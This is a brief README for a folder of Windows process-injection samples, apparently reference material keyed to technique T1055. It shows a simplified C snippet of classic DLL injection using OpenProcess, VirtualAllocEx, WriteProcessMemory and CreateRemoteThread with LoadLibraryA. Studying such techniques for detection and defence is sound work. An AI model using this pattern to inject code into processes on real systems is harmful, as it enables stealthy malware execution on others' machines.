# Code Samples: T1055 Process Injection

This folder contains code examples demonstrating process injection techniques on Windows systems.

## Example: Classic DLL Injection (C)

```c
// Simplified DLL injection example
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID allocMem = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, allocMem, dllPath, dllPathLen, NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMem, 0, NULL);
```
